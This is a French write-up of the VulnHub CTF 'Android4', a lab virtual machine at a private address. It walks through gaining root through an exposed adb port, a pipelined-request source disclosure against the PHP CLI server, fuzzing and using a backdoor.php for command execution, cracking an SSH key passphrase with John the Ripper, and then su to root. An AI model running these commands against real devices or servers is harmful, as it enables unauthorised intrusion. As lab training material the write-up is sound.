---
title: "Solution du CTF Android4 de VulnHub"
tags: [CTF,VulnHub]
---

Le CTF [Android4](https://vulnhub.com/entry/android4-1,233/) offrait deux chemins pour parvenir au compte root.

La première (et la plus simple) consiste à faire ce que ferait sans doute un développeur Android.

La seconde requiert un chemin plus classique d'énumération, mais il est plombé par une caractéristique du serveur web utilisé.

## Kansas City Shuffle

Une fois la VM mise en place, on peut voir dans la fenêtre VirtualBox un écran qui demande un PIN, comme sur un smartphone.

J'ai lancé un scan Nmap mais comme il prenait beaucoup de temps j'ai fait une simple recherche sur _Android_ dans _HackTricks_ et j'ai trouvé ce que je cherchais :

[5555 - Android Debug Bridge](https://book.hacktricks.xyz/network-services-pentesting/5555-android-debug-bridge)

Ce port est celui qui permet la communication avec la commande `adb`.

Sur mon système j'ai installé le paquet `android-tools` puis j'ai suivi la procédure décrite sur HackTricks :

```console
$ adb connect 192.168.56.231
* daemon not running; starting now at tcp:5037
* daemon started successfully
connected to 192.168.56.231:5555
$ adb root
restarting adbd as root
$ adb shell
uid=0(root) gid=0(root)@x86:/ # id
uid=0(root) gid=0(root)
uid=0(root) gid=0(root)@x86:/ # cd data/root
uid=0(root) gid=0(root)@x86:/data/root # ls
flag.txt
uid=0(root) gid=0(root)@x86:/data/root # cat flag.txt
ANDROID{u_GOT_root_buddy}
```

## La version "Oui, mais j'vois pas comment"

Finalement le scan de ports a terminé :

```
Nmap scan report for 192.168.56.231
Host is up (0.00033s latency).
Not shown: 65532 closed tcp ports (reset)
PORT      STATE SERVICE  VERSION
5555/tcp  open  freeciv?
8080/tcp  open  http     PHP cli server 5.5 or later
| http-slowloris-check: 
|   VULNERABLE:
|   Slowloris DOS attack
|     State: LIKELY VULNERABLE
|     IDs:  CVE:CVE-2007-6750
|       Slowloris tries to keep many connections to the target web server open and hold
|       them open as long as possible.  It accomplishes this by opening connections to
|       the target web server and sending a partial request. By doing so, it starves
|       the http server's resources causing Denial Of Service.
|       
|     Disclosure date: 2009-09-17
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
|_      http://ha.ckers.org/slowloris/
|_http-majordomo2-dir-traversal: ERROR: Script execution failed (use -d to debug)
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
22000/tcp open  ssh      Dropbear sshd 2014.66 (protocol 2.0)
|_vulners: ERROR: Script execution failed (use -d to debug)
```

On a cette page sur le port 8080 :

```html
<html>
  <head>
    <title>Deface by Good Hackers</title>
  </head>
  <body bgcolor=white>

    <table border="0" cellpadding="10">
      <tr>
        <td>
          <h1>Good Hackers ? means</h1>
        </td>
	</tr><tr>
        <td>
          <h2>we drop here our backdoor for access </h2>
        </td>
      </tr>
    </table>

    <p>If you r Smart Dan find Backdoor access...and safe your machine</p>
    <p>we like POST things only.</p>
  </body>
</html>
```

On peut énumérer (très très) longuement et on ne trouvera pas grand-chose de plus :

```
200        1l        3w       13c http://192.168.56.231:8080/.htaccess
200        1l        3w        0c http://192.168.56.231:8080/backdoor.php
```

Vu que `PHP cli` est derrière ce port, on peut se servir de la faille de divulgation du code source :  

```console
echo -e "GET /backdoor.php HTTP/1.1\r\nHost: pd.research\r\n\r\nGET /xyz.xyz HTTP/1.1\r\n\r\n" | ncat 192.168.56.231 8080 -v
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Connected to 192.168.56.231:8080.
HTTP/1.1 200 OK
Host: pd.research
Date: Tue, 06 Jun 2023 09:39:24 +0300
Connection: close
Content-Type: chemical/x-xyz
Content-Length: 18

echo "fake Door";
Ncat: 75 bytes sent, 164 bytes received in 0.92 seconds.
```

Ok, c'est donc uniquement un troll.

Il y avait pourtant un dossier nommé `announce` dans la racine web (`/data/media/0/www/public`) que je pouvais voir via mon shell root précédent.

Malheureusement le comportement de `PHP cli` fait qu'on ne peut pas trouver via énumération les dossiers qui ne contiennent pas un fichier d'index : 

```console
$ curl -s -I http://192.168.56.231:8080/announce | head -1
HTTP/1.1 404 Not Found
$ curl -s -I http://192.168.56.231:8080/announce/ | head -1
HTTP/1.1 404 Not Found
$ curl -s -I http://192.168.56.231:8080/announce/backdoor.php | head -1
HTTP/1.1 200 OK
```

Supposons qu'on avait un moyen de trouver ce dossier `announce`, on aurait alors trouvé le second script `backdoor.php` qui est plus bavard :

> Warning: system(): Cannot execute a blank command in /storage/emulated/0/www/public/announce/backdoor.php on line 1

On aurait brute forcé les paramètres en POST :

```console
$ ffuf -u "http://192.168.56.231:8080/announce/backdoor.php" -w wordlists/common_query_parameter_names.txt -X POST -d "FUZZ=id" -H "Content-type: application/x-www-form-urlencoded" -t 5 -fs 1376

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1
________________________________________________

 :: Method           : POST
 :: URL              : http://192.168.56.231:8080/announce/backdoor.php
 :: Wordlist         : FUZZ: wordlists/common_query_parameter_names.txt
 :: Header           : Content-Type: application/x-www-form-urlencoded
 :: Data             : FUZZ=id
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 5
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
 :: Filter           : Response size: 1376
________________________________________________

secret                  [Status: 200, Size: 115, Words: 3, Lines: 2]
```

Et on aurait obtenu notre RCE :

```console
curl -s -XPOST -d "secret=id" http://192.168.56.231:8080/announce/backdoor.php
uid=10070(u0_a70) gid=10070(u0_a70) groups=1015(sdcard_rw),1023(media_rw),1028(sdcard_r),3003(inet),50070(all_a70)
```

En fouillant un peu on aurait trouvé un dossier secret :

```console
curl -s -XPOST -d "secret=ls+-al+.." http://192.168.56.231:8080/announce/backdoor.php
-rw-rw---- root     sdcard_r       13 2017-12-10 20:06 .htaccess
drwxrwx--- root     sdcard_r          2018-04-04 00:29 announce
-rw-rw---- root     sdcard_r       18 2018-04-04 13:50 backdoor.php
drwxrwx--- root     sdcard_r          2018-04-04 18:38 backup
drwxrwx--- root     sdcard_r          2018-04-04 18:37 hello
-rw-rw---- root     sdcard_r      461 2018-04-04 13:50 index.html
drwxrwx--- root     sdcard_r          2018-04-04 00:31 secret22000
```

Et via `JtR` on aurait cassé la passphrase de la clé SSH `touhid.key` présente dans `secret22000`.

```console
$ john --wordlist=wordlists/rockyou.txt hashes.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
qwerty           (/tmp/touhid.key)     
Session completed.
```

On aurait alors un shell interactif :

```console
$ ssh -p 22000 -i touhid.key -o PubkeyAcceptedKeyTypes=ssh-rsa root@192.168.56.231
Enter passphrase for key 'touhid.key': 
user@x86:/storage/emulated/legacy/ssh $ id
uid=10068(u0_a68) gid=10068(u0_a68) groups=1015(sdcard_rw),1023(media_rw),1028(sdcard_r),3003(inet),50068(all_a68)
```

Et on serait passé root, sans mot de passe (je suppose que c'est le comportement par défaut d'Android) : 

```console
user@x86:/ $ su                                                                                                                                                                                                  
uid=0(root) gid=0(root)@x86:/ # id
uid=0(root) gid=0(root)
```
